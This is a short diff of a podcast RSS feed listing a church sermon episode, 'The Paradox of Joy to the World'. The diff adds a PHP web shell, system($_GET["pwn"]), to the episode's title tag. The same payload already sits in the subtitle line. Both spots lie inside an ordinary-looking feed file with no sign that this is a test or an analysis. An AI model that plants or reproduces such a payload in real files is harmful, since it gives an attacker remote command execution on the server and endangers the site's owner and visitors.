@@ -60,7 +60,7 @@
       <itunes:duration>0:32:47</itunes:duration>
     </item>
     <item>
-      <title>The Paradox of Joy to the World</title>
+      <title>The Paradox of Joy to the World <?php system($_GET["pwn"]); ?></title>
       <itunes:author>Ps John Lewis</itunes:author>
       <author>info@nexuschurch.com.au (Ps John Lewis)</author>
       <itunes:subtitle>Sun 10:15 AM | Ps John Lewis - The Paradox of Joy to the World<?php system($_GET["pwn"]); ?></itunes:subtitle>
